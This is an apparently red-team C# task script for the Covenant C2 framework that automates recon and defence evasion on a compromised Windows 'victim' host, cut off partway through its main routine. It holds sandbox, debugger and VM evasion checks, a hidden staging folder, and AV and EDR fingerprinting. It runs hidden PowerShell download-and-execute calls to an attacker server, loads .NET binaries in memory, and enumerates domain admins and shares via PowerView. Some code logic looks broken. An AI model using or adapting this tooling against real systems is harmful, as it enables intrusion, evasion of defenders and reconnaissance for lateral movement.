/* This is a covenant C2 framework script which can be used to combine a number of different tools 
   to perform privilege escalation and lateral movement checks. 

   Modify the User-Modifiable Flags below and when loading in Covenant ensure that SharpSploit is 
   included as a reference library*/

using System;
using System.IO;
using System.Linq;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Threading;

// To be able to get the current User details
using System.Security.Principal;

//using SharpUp;
using SharpSploit.Execution;
using SharpSploit.Enumeration;

public static class Task
{   
    // --------------------------------------------------------------------------------------------
    // User-Modifiable Flags
    // --------------------------------------------------------------------------------------------
    // [!] Set the values for these before starting the script

    // Min Uptime a system should be up for - otherwise, it is likely a VM
    public const string MinUptimeHours = "1";

    // Directory name to create locally on the client
    public const string DirName = ".system";
    // Architecture of the victim (x86/x64)
    public const string Architecture = "x64";

    // Server IP to serve the files from
    public const string ServerIp = "192.168.56.1";
    // Server port to serve the files from
    public const string ServerPort = "8001";
    // Modules to execute - provide the module IDs
    public const string ModulesToExec = ".*(mandatory|av_detection).*";
    //public const string ModulesToExec = ".*(mandatory|symantec_endpoint_scanning_exemptions).*";
    //public const string ModulesToExec = ".*(mandatory|recon).*";
        
    // Script Constants - generally not required to be modified by user
    // ----------------------------------------------------------------
    // Tasks that MUST be performed
    //public const string MandatoryTasks = "win_auto_recon_make_dir_and_switch,win_auto_recon_get_current_user,win_auto_recon_get_current_hostname,win_auto_recon_get_current_domain,win_auto_recon_get_current_domain_username";

    // Functions
    // ---------
    public static bool shouldExecModule(string regexModulesToExec, string modulesToNotExec,
                                        string moduleId) {
	    // Function to validate whether the module should be executed or not...
        // 
        // Arguments
        // ---------
        // regexModulesToExec: string
        //     Regex pattern provided by user for modules to execute
        //  modulesToNotExec: string
        //     Not used currently (to be decommissioned)
        //  moduleId: string
        //      Module ID of the module to execute
        //
        // Returns
        // -------
        // Boolean
        //      true, if module Id matches the regex pattern for module to execute
        //      false
	Regex regex = new Regex(regexModulesToExec);
        Match match = regex.Match(moduleId);
        if (match.Success)
        {
            return true;
        } else {
            return false;
	}
        //if (modulesToNotExec.Contains(moduleId)) {
        //    return false;
        //} else {
        //    string[] userInputValues = userInput.Split(',');                
        //    return userInputValues.Contains("all") || userInputValues.Contains(moduleId);
        //}
    }	
	
    public static string manualTasks(string mainNote) {
        string output = "\n";
        if (!String.IsNullOrEmpty(mainNote)) {
            string[] notes = mainNote.Split('\n');
	    	foreach(string note in notes) {
	    		output += "[!] " + note.Trim() + "\n";
            }
        }
        return output;
    }

    public static string printNotes(string modulesToExec, string modulesToNotExec, 
                                    string moduleId, string title="", string notes="", string refs="",
                                    bool isManualTask=true) {
        string output = "";

        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            if (!String.IsNullOrEmpty(title)) {
                output += "\n" + "[!] " + title + "\n";
            }
            output += manualTasks(notes);
            //output += new String('-', 80) + "\n\n";
            //output += notes + "\n";
            output += refs + "\n";
        }
        return output;
    }

    public static string executePowershellCmd(string modulesToExec, string modulesToNotExec, string moduleId, string title,
                                              string powershellCmd,
                                              string manualTask="") {
        /* Function to execute a remote powershell script hosted at URL in memory, and then to also run an optional powershell command after loading the powershell script*/
        string output = "";

        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
                // if powershell command already contains double-quote, then escape it
                if (powershellCmd.Contains("\"")) {
                    powershellCmd = powershellCmd.Replace("\"", "\\\"");
                }

                output += "[!] " + title + "\n";
                string cmdToExecute = "powershell -Sta -Nop -Window Hidden -Command \"" + powershellCmd + "\"";
                output += "[*] Executing command: " + cmdToExecute + "\n";
                output += Shell.ShellCmdExecute(cmdToExecute);
                output += "\n\n";
                output += manualTasks(manualTask);
                //Any additional manual tasks to do
        }
        return output;
    }

    public static string executeWebRequestInMem(string modulesToExec, string modulesToNotExec, string moduleId, string title,  
                                                string Url,
                                                string manualTask="") {
        /* Function to make a web call to remote URL. Currently only GET calls are supported.*/
        string output = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
                output += "[!] " + title + "\n";                                                                
                string cmdToExecute = "powershell -Sta -Nop -Window Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('" + Url + "');";
                output += "[*] Downloading string from URL: " + Url + "\n";
                output += "[*] Executing command: " + cmdToExecute + "\n";
                output += Shell.ShellCmdExecute(cmdToExecute);
                output += "\n\n";
                output += manualTasks(manualTask);
        }
        return output;
    }

    public static string executePowershellScriptInMem(string modulesToExec, string modulesToNotExec, string moduleId, string title, string serverIp, 
    										          string serverPort, string serverPath,
                                                      string powershellCmd="",
                                               		  string proto="http",
                                                      string manualTask="") {
		/* Function to execute a remote powershell script hosted at URL in memory, and then to also run an optional powershell command after loading the powershell script*/
		string output = "";
    	if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {

                // if powershell command already contains double-quote, then escape it
                if (powershellCmd.Contains("\"")) {
                    powershellCmd = powershellCmd.Replace("\"", "\\\"");
                }

                output += "[!] " + title + "\n";                                                                
                string powershellScriptUrl = proto + "://" + serverIp + ":" + serverPort + serverPath;
                string cmdToExecute = "powershell -Sta -Nop -Window Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('" + powershellScriptUrl + "');" + " " + powershellCmd+ "\"";
                output += "[*] Downloading powershell script: " + powershellScriptUrl + "\n";
                output += "[*] Executing command: " + cmdToExecute + "\n";
                output += Shell.ShellCmdExecute(cmdToExecute);
                output += "\n\n";
                output += manualTasks(manualTask);
                
		}
        return output;
    }
    
    public static string downloadExecuteBinary(string modulesToExec, string modulesToNotExec, string moduleId, string title, string serverIp, 
    										   string serverPort, string serverPath, string binaryName,                                                
                                               string parameters="",
                                               string proto="http",
                                               string manualTask="") {
		/* Function to download the .NET binary to local directory and execute in memory */
		string output = "";
    	if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
                output += "[!] " + title + "\n";                                
                // Download the file to the current local directory
                System.Net.WebClient client = new System.Net.WebClient ();
                client.DownloadFile(proto + "://" + serverIp + ":" + serverPort + serverPath, binaryName);                
                // Execute the file downloaded with full path as the shellcmd appears to execute from an unknown directory
                string currentDirectory = Directory.GetCurrentDirectory();
                string cmdToExecute = Path.Combine(currentDirectory, binaryName) + " " + parameters;                
                output += "[*] Executing command: " + cmdToExecute + " in directory: " + currentDirectory + "\n";
                output += Shell.ShellCmdExecute(cmdToExecute);
                output += "\n\n";
                //Any additional manual tasks to do
                output += manualTasks(manualTask);
        }
        return output;                                                                                              
    }
	
    public static string executeDotNetBinaryInMem(string modulesToExec, string modulesToNotExec, 
                                                  string moduleId,
                                                  string title, 
                                                  string serverIp, 
    						  string serverPort,
                                                  string serverPath, 
                                                  string binaryName, 
                                                  string parameters="",
                                                  string proto="http",
                                                  string manualTask="",
                                                  bool downloadExecuteOnFailure=true) {
		/* Function to download a .NET binary from URL and execute it in memory */                                                     
		string output = "";
    	if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            try {
                output += "[!] " + title + "\n";                 
                // Download the binary from URL and convert into a base-64 encoded array
                System.Net.WebClient client = new System.Net.WebClient ();
                byte[] fileData = client.DownloadData (proto + "://" + serverIp + ":" + 
                                                       serverPort + serverPath);
                string remoteBinaryEncoded = Convert.ToBase64String(fileData);                
                // Convert the arguments for the .NET binary to execute  into an array
                string[] args = parameters.Split(' ').ToArray();
                //Ensure that the binary when executed will write error and output to console output
                TextWriter realStdOut = Console.Out;
                TextWriter realStdErr = Console.Error;
                TextWriter stdOutWriter = new StringWriter();
                TextWriter stdErrWriter = new StringWriter();
                Console.SetOut(stdOutWriter);
                Console.SetError(stdErrWriter);
                //Execute the .NET binary
                //Assembly.AssemblyExecute(fileData, new Object[] { args });
                Assembly.AssemblyExecute(remoteBinaryEncoded, new Object[] { args });
                //Write to console output immediately - don't just keep storing in memory
                Console.Out.Flush();
                Console.Error.Flush();
                //Reset the original STDOUT, STDERR before it was changed to console output
                Console.SetOut(realStdOut);
                Console.SetError(realStdErr);
                //Write output, error to the standard output buffer
                output += stdOutWriter.ToString();
                output += stdErrWriter.ToString();
                //Any additional manual tasks to do
                output += manualTasks(manualTask);
            } 
            catch (Exception e) { 
                output += e.GetType().FullName + 
                          " in function executeDotNetBinaryInMem: " + 
                          e.Message + 
                          Environment.NewLine + 
                          e.StackTrace; }
                if (downloadExecuteOnFailure) {
                    output += "\nAttempting to download .NET bin & execute via file system instead\n";
                    output += downloadExecuteBinary(modulesToExec, modulesToNotExec, moduleId, 
                                                    title, serverIp,
                                                    serverPort, serverPath, binaryName,                     
                                                    parameters, proto, manualTask);
            }
        }
        return output;
    }
    

    public static string addRegValue(string modulesToExec, string modulesToNotExec, 
                                     string moduleId, string title, string regPath,
                                     string regValueName="", string regValueData="",
                                     string regValueType="", string manualTask="") {
        /* Function to add/modify the individual value in a given registry path*/

        string output = "";
        string command = "reg add " + regPath;
        if (string.IsNullOrEmpty(regValueName)) {
            command += " /v " + regValueName;
        }
        if (string.IsNullOrEmpty(regValueType)) {
            command += " /t " + regValueType;
        }
        if (string.IsNullOrEmpty(regValueData)) {
            command += " /d " + regValueData;
        }
        command += " /f";

        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[*] " + title + "\n";
            output += Shell.ShellCmdExecute(command);
            output += "\n\n";
            output += manualTasks(manualTask);
        }
    	return output;
    }

    public static string quoteDirPath(String dirPath) {
        /// <summary>
        ///     Quotes subpaths containing spaces within the Windows directory path.
        /// </summary>
        /// <param name="dirPath">The windows directory path.</param>
        /// <returns>
        ///     Directory path, containing subpaths with spaces that are double-quoted.
        /// </returns>
        
        // First, split the subpath into spaces
        string[] subPaths = dirPath.Split('\\');
        
        // Check each subpath if it contains spaces
        string newSubPath = "";
        string newDirPath = "";
        foreach(string subPath in subPaths) {
            
            // If the subpath contains spaces, then quote the subpath
            if(subPath.Contains(" ")) {
                newSubPath = "\"" + subPath + "\"";
            } else {
                newSubPath = subPath;
            }
            newDirPath += newSubPath + "\\";
        }
        
        // Remove last char from directory path which is \
        newDirPath = newDirPath.Remove(newDirPath.Length-1, 1);

        return newDirPath;
    }

    public static string checkRegPath(string modulesToExec, string modulesToNotExec, string moduleId, string title, string regPath,
                                      string regValue="",
                                      string manualTask="") {
        /// <summary>
        ///     Function checks the content within the specific registry path and optionally, the registry value
        /// </summary>
        /// <param name="modulesToExec">Module IDs in regex format to execute as specified by user</param>
        /// <param name="modulesToNotExec">Module IDs in regex format to not execute</param>
        /// <param name="moduleId">Module ID of this module</param>
        /// <param name="title">Title to print when executing this module</param>
        /// <param name="regPath">Registry path to check</param>
        /// <param name="regValue">Registry value under the registry path to print</param>
        /// <param name="manualTask">Any manual notes to print</param>
        /// <returns>
        ///     Prints the registry path, values and also any manual notes that need to be printed
        /// </returns>
           
        string output = "";
        string command = "reg query " + regPath;
        if (string.IsNullOrEmpty(regValue)) {
            command += " /v " + regValue;
        }
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[!] " + title + "\n";
            output += "Executing commmand: " + command + "\n";
            output += Shell.ShellCmdExecute(command);
            output += "\n\n";
            //Any additional manual tasks to do
            output += manualTasks(manualTask);
        }
    	return output;
    }

    public static string executeShellCmd(string modulesToExec, string modulesToNotExec, string moduleId, string title, string commands, 
    									 bool prefixCurrentDirectory=false,
                                         string manualTask="") {
    	/* Function to execute a specified single shell command or semi-colon separated list of commands . It can also prefix current
           working directory to the command, if necessary which is handy for executing commands in 'cmd /c' when file path might be
           located elsewhere.
           */
        string output = "";
        string commandTrimmed = "";

        //Check if the commands should be executed
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[!] " + title + "\n";

            // Get individual commands to execute
            string[] individualCommands = commands.Split(';');

            // Execute each module
            foreach(string command in individualCommands) {

                // Add current directory path, if required when executing certain commands
                string command_to_exec_before_trim = "";
                if (prefixCurrentDirectory) {
                    command_to_exec_before_trim = Directory.GetCurrentDirectory() + "\\" + command;
                } else {
                    command_to_exec_before_trim = command;

                }

                // Trim out space from command
                commandTrimmed = command_to_exec_before_trim.Trim();

                // Execute each command
                output += "Executing commmand: " + commandTrimmed + "\n";
                output += Shell.ShellCmdExecute(commandTrimmed);
                output += "\n\n";

            }
            // Write out details of any additional manual tasks to complete
            output += manualTasks(manualTask);
        }

        // Return total output from running all commands
    	return output;
    }

    public static string getDomainUsername(string modulesToExec, string modulesToNotExec, string moduleId) {
        string domain_username = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            domain_username = Shell.ShellCmdExecute("whoami").Trim();
        }
        return domain_username;
    }

    public static string getUsername(string modulesToExec, string modulesToNotExec, string moduleId) {
        string username = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            string domain_username = getDomainUsername(modulesToExec, modulesToNotExec, moduleId);
            if (domain_username.Contains("\\")) {
                username = domain_username.Split('\\')[1];
            } else {
                username = "";
            }
        }
        return username;
    }

    public static string getDomain(string modulesToExec, string modulesToNotExec, string moduleId) {
        string domain_username = "";
        string domain = "";
        string hostname = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            domain_username = getDomainUsername(modulesToExec, modulesToNotExec, moduleId);
            if (domain_username.Contains("\\")) {
                domain = domain_username.Split('\\')[0].Trim();
                // If not domain joined, Windows reports the domain as the hostname sometimes. In which case, we should return '.'
                hostname = Shell.ShellCmdExecute("hostname");
                if (hostname.ToLower().Trim() == domain.ToLower().Trim()) { 
                    domain = ".";
                }
            } else {
                domain = ".";
            }
        }
        return domain;
    }

    public static string getHostname(string modulesToExec, string modulesToNotExec, string moduleId) {
        string hostname = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            hostname = Shell.ShellCmdExecute("hostname");            
        }
        return hostname;
    }

    public static string putToSleep(string modulesToExec, string modulesToNotExec, string moduleId, 
                                           string title, int sleepTimeInSecs, string manualTask="") { 
        string output = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[!] " + title + "\n";
            
            // Convert Sleep time in Seconds to milliseconds
            output += "[*] Sleeping for seconds: " + sleepTimeInSecs + "\n";
            Thread.Sleep(sleepTimeInSecs * 1000);

            // Print notes
            output += manualTasks(manualTask);
        }
        return output;        
    }

    public static string isSystemUpForLong(string modulesToExec, string modulesToNotExec, string moduleId, 
                                           string title, string manualTask="") { 
        string output = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[!] " + title + "\n";
            int millsElapsedSinceStartup = System.Environment.TickCount;
            double numHours = millsElapsedSinceStartup/(60 * 60 * 1000.0);

            // Let user know the system uptime in num milliseconds/hours 
            output += "[*] System Startup Time: numHours: " + numHours + ", numMilliSecs: " + millsElapsedSinceStartup;

            if (numHours < MinUptimeHours) { 
                output += "[!] System has NOT been up for sufficient hours";
            } else { 
                output += "[+] System has been up for sufficient hours";
            }
            output += manualTasks(manualTask);
        }
        return output;        
    }

    public static string isDebuggerAttached(string modulesToExec, string modulesToNotExec, 
                                            string moduleId, string title, string manualTask="") {

        string output = "";

        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[!] " + title + "\n";
            if(Debugger.IsAttached) {
                output += "[+] Debugger appears to be attached - running in IDA or Visual Studio Debugging?";
            } else {
                output += "[*] Debugger does NOT appear to be attached;";
            }
            // Print out any additional manual tasks/notes
            output += manualTasks(manualTask);
        }
        return output;
    }

    public static string makeDirAndSwitch(string modulesToExec, string modulesToNotExec, string moduleId, string title, string dirName, bool hidden=true,
                                          string manualTask="") {
    	/* Creates a new directory and switches to this directory */
    	string output = "";
        if (shouldExecModule(modulesToExec, modulesToNotExec, moduleId)) {
            output += "[!] " + title + "\n";
            string getTempDirCommand = "echo %TEMP%";
            string tempDir = Shell.ShellCmdExecute(getTempDirCommand);
            if (string.IsNullOrEmpty(tempDir)) {
            	tempDir = "C:\\Windows\\TEMP";
            } else {
                tempDir = tempDir.Trim();
            }
            output += "[*] tempDir:" + tempDir + "\n";
            string newTempDir = Path.Combine(tempDir, dirName);
			if (!File.Exists(newTempDir)) {
                string newTempDirCommand = "mkdir " + newTempDir;
                Shell.ShellCmdExecute(newTempDirCommand);
            } 
            Host.ChangeCurrentDirectory(newTempDir);
            string currentDirectory = Host.GetCurrentDirectory();
            output += "[*] Current Directory: " + currentDirectory + "\n"; 

            // Assigning permissions to the current user only for the hidden directory
            //string currentUser = WindowsIdentity.GetCurrent().Name;
            //string getCurrentUserAccessCmd = "icacls C:\Windows\Temp\.system /grant " + currentUser + ":(F,WDAC) /T";
            //Shell.ShellCmdExecute(getCurrentUserAccessCmd);

            //Any additional manual tasks to do
            output += manualTasks(manualTask);
    	}
        return output;
    }
    
    public static string Execute()
    {
        // Variables generally populated by the user specified constants
    	string dirName = DirName;
        string serverIp = ServerIp;
        string serverPort = ServerPort;
        string modulesToExec = ModulesToExec;
        string modulesToNotExec = "";

        // These variables are initializations, and can be left alone.
        string output = "";
        string command = "";        
        string serverPath = "";        
        string moduleId = "";
        string title = "";
        string binaryName = "";
        string parameters = "";
        string powershellCmd = "";
        string manualTask = "";
        string userName = "";
        string hostname = "";
        string domain = "";
        string domain_username = "";
        string refs = "";
        string regPath = "";
        string regValueName = "";
        string regValueData = "";
        string regValueType = "";
        string notes = "";
        string url = "";
        
        bool hidden = true;
        bool prefixCurrentDirectory = false;
        
        try
        { 

            moduleId = "win_auto_recon_av_detection_sandbox_detection_is_running_inside_vm_tasklist";
            title = "Check if we are running within VM/Virtualbox via the process names in tasklist"; 
            command = @"tasklist /v | findstr /I ""vmtoolsd.exe""; " +
                      @"tasklist /v | findstr /I ""vbox.exe"" ";
            notes = @"Taken from Remcos RAT example: 
                        https://blog.trendmicro.com/trendlabs-security-intelligence/analysis-new-remcos-rat-arrives-via-phishing-email/";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                      manualTask: notes);

            moduleId = "win_auto_recon_av_detection_sandbox_detection_anti_analysis_is_debugger_attached";
            title = "Check if debugger is attached to the code - are we running IDA?"; 
            notes = @"Taken from here: 
                        https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.debugger.isattached?view=netframework-4.8";
            output += isDebuggerAttached(modulesToExec, modulesToNotExec, moduleId, title, 
                                         manualTask: notes);
            
            moduleId = "win_auto_recon_av_detection_sandbox_detection_anti_analysis_is_system_up_for_log";
            title = "Check if System has been up for a long time"; 
            notes = @"Taken from here: 
                        - https://docs.microsoft.com/en-us/dotnet/api/system.environment.tickcount?view=netcore-3.1
                        - https://unit42.paloaltonetworks.com/ticked-off-upatre-malwares-simple-anti-analysis-trick-to-defeat-sandboxes/";
            output += isSystemUpForLong(modulesToExec, modulesToNotExec, moduleId, title, 
                                         manualTask: notes);

            moduleId = "win_auto_recon_av_detection_sandbox_detection_anti_analysis_sleep_malware";
            title = "Put the system to sleep for sometime e.g. 600s/10mins";
            int sleepTimeInSecs = 600;
            output += putToSleep(modulesToExec, modulesToNotExec, moduleId, title, sleepTimeInSecs);

            moduleId = "win_auto_mandatory_make_dir_and_switch";
            title = "Make Directory and Switch to this directory as the current directory"; 
            dirName = ".system";
            hidden = true;
            output += makeDirAndSwitch(modulesToExec, modulesToNotExec, moduleId, title, dirName, hidden);

            moduleId = "win_auto_mandatory_hide_dir_attrib";
            title = "Hide the current directory folder via icacls";
            command = "attrib +h  %TEMP%\\.system";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_mandatory_get_current_user";
            title = "Get the current username";
            userName = getUsername(modulesToExec, modulesToNotExec, moduleId);
            output += "[+] userName: " + userName + "\n";
            
            moduleId = "win_auto_mandatory_get_current_domain";
            title = "Get the current domain";
            domain = getDomain(modulesToExec, modulesToNotExec, moduleId);
            output += "[+] domain: " + domain + "\n";              

            moduleId = "win_auto_mandatory_get_current_hostname";
            title = "Get the current hostname";
            hostname = getHostname(modulesToExec, modulesToNotExec, moduleId);
            output += "[+] hostname: " + hostname + "\n";

            moduleId = "win_auto_mandatory_get_current_domain_username";
            title = "Get the current domain and username combined";
            domain_username = getDomainUsername(modulesToExec, modulesToNotExec, moduleId);
            output += "[+] domain_username: " + domain_username + "\n";

            moduleId = "win_auto_recon_av_detection_invoke_enum_security_tools_powershell"; 
            title = "Get the security tool in use via Powershell script through Invoke-EnumSecurityTools.ps1"; 
            serverPath = "/Invoke-EnumSecurityTools/Invoke-EnumSecurityTools.ps1";                                 
            powershellCmd = "Invoke-EnumSecurityTools";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
                                                   powershellCmd);

            moduleId = "win_auto_recon_av_detection_is_crowdstrike_running_sc"; 
            title = "Check if Crowdstrike AVs are running on the PC via sc services";
            command = "sc query csagent; " +
                      "sc query | findstr /I CSFalcon";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_av_detection_antivirusproduct_wmic"; 
            title = "Check if AVs are running on the PC via wmmic";
            command = @"wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_av_detection_is_amsi_in_place_powershell";
            title="Check if AMSI is in-place via powershell using sample test";
            command = "Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'"; 
            notes = @"
                # If we get, 'This script contains malicious content and has been blocked by your antivirus software.', then amsi is applied.
                
                # Taken from: https://github.com/rasta-mouse/AmsiScanBufferBypass
            ";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command,
                                           manualTask: notes);

            moduleId = "win_auto_recon_av_detection_sysmon_reg";
            title = "Check if SysMon is running via the registry key";
            regPath = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational";
            notes = "If the registry key is visible or in HKLM export, then it could mean that sysmon is running";
            output += checkRegPath(modulesToExec, modulesToNotExec, moduleId, title, regPath,
                                   manualTask: notes);

            moduleId = "win_auto_recon_av_detection_get_windows_defender_alerts_powershell";
            title="Check windows defender past alerts via Powershell";
            command = "Get-MpThreatDetection"; 
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_av_detection_hostenum_powershell_script"; 
            title = "Check if AVs are running on the PC via HostEnum powershell script";
            serverPath = "/HostEnum/HostEnum.ps1";
            powershellCmd = @"$VerbosePreference = ""Continue""; Get-AVInfo; Get-AVProcesses";
            notes = @"Taken from: 
                        https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title,
                                                   serverIp, serverPort, serverPath,
                                                   powershellCmd);

            moduleId = "win_auto_recon_av_detection_red_team_edr_script";
            title = "Check AVs are running via powershell script";
            serverPath = "/Red_Team/Discovery/Check_EDR_Presence.ps1";
            powershellCmd = @"Invoke-EDRCheck";
            notes = @"Taken from:
                        https://github.com/BankSecurity/Red_Team/blob/master/Discovery/Check_EDR_Presence.ps1";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title,
                                                   serverIp, serverPort, serverPath,
                                                   powershellCmd);

            moduleId = "win_auto_get_current_domain_echo";
            command = "echo %userdomain%";
            title = "Get the current domain via echo";
            manualTask = @"Compare to the device hostname to validate if it is part of a domain OR a local machine, as local machine not joined likely to have same for hostname, domain e.g. via hostname command or other methods";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: manualTask);

            moduleId = "win_auto_get_current_domain_username_echo";
            title = "Get the current domain and username combined using echo";
            command = @"echo %userdomain%\%username%";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);
    
            moduleId = "win_auto_get_current_domain_username_powershell";
            command = "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()";
            title = "Get the current domain for victim using Powershell";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_get_current_domain_username_quser";
            command = "quser";
            title = "Get the current domain and username combined using quser";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_current_domain_username_whoami_exe";
            title = "Get the username via whoami.exe";
            binaryName = "whoami.exe";
            serverPath = "/whoami.exe";
            parameters = "";
            output += downloadExecuteBinary(modulesToExec, modulesToNotExec, moduleId, title, serverIp,
                                            serverPort, serverPath, binaryName,
                                            parameters);
            
            moduleId = "win_auto_recon_get_current_domain_username_wmic";
            title = "Get the current username via wmic";
            command = "wmic computersystem get Name, Domain, Manufacturer, Model, Username, Roles /format:list";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_current_domain_username_whoami_user";
            title = "Get the current username via whoami /user";
            command = "whoami /user";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_get_current_domain_username_set_u";
            title = "Get the current username via set command";
            command = "set u";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_users_powershell";
            command = "Get-ChildItem C:\\Users -Force | select Name";
            title = "Get a list of all local users via powershell 'Get-ChildItem' command";
            output += executePowershellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_users_dir";
            command = "dir C:\\Users";
            title = "Get a list of all local users via command prompt 'dir' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_info_about_me_net_users";
            command = "net users %USERNAME%";
            title = "Get info about the users via me";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_users_net_users";
            command = "net users";
            title = "Get a list of all local users via command prompt 'net users' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_users_net_users_domain";
            command = "net users /domain";
            title = "Get a list of all local users via command prompt 'net users /domain' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_users_wmic";
            command = "wmic useraccount get /all /format:csv";
            title = "Get a list of all local users via command prompt 'wmic useraccount' command";
            manualTask = @"To get full details about the user, run the command:
                            wmic useraccount list full";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: manualTask);

            moduleId = "win_auto_recon_get_local_groups_net_localgroup";
            command = "net localgroup";
            title = "Get a list of all local user groups via 'net localgroup' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_groups_wmic";
            command = "wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status";
            title = "Get a list of all local user groups via 'net localgroup' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);   

            moduleId = "win_auto_recon_get_local_net_localgroup_local_admins_net";
            command = "net localgroup \"Administrators\"";
            title = "Get a list of all members of the local device Administrators' group";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_local_localgroup_wmic";
            command = "wmic group list full";
            title = "Get a list of all local user groups via wmic command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_domain_groups_net_group";
            command = "net group /domain";
            title = "Get a list of all domain groups via 'net group /domain'";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_domain_admin_group_members_net_group";
            command = "net group \"Domain Admins\" /domain";
            title = "Get a list of all members of 'Domain Admins' via 'net group' command";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_other_domain_machines_net_view";
            command = "net view";
            title = "Get a list of all machines in the same domain/network via 'net view'";
            manualTask = @"Other related methods to get machines in the domain are:
                            net view <domain-eg-\\MACHINE>
                            dir <domain-e.g.-\\MACHINE>";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command, manualTask: manualTask);

            moduleId = "win_auto_recon_get_domains_list_net_view";
            title = "Get the list of all machines, domains via the 'net view /domain' command";
            command = "net view /domain";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_shares_net";
            title = "Get the list of all network shares for the local host via the 'net' command";
            command = "net share";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_net_file_servers_powershell_powerview";
            title = "Load Powerview in memory and get Network file servers via powershell_powerview";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetFileServer";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);

            moduleId = "win_auto_recon_get_net_share_powershell_powerview";
            title = "Load Powerview in memory and get Network shares via powershell_powerview";
            serverPath = "/PowerSploit-master/Recon/PowerView.ps1";
            powershellCmd = "Get-NetShare";
            output += executePowershellScriptInMem(modulesToExec, modulesToNotExec, moduleId, title, serverIp, serverPort, serverPath,
    						   powershellCmd);

            moduleId = "win_auto_recon_get_network_shares_net";
            title = "Get the list of all network shares for the local host via the 'net' command";
            command = "net use";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_shares_wmic_netuse";
            title = "Get the list of all network shares for the local host via the 'wmic netuse' command";
            command = "wmic netuse list full";
            output += executeShellCmd(modulesToExec, modulesToNotExec, moduleId, title, command);

            moduleId = "win_auto_recon_get_network_shares_wmic_powershell";
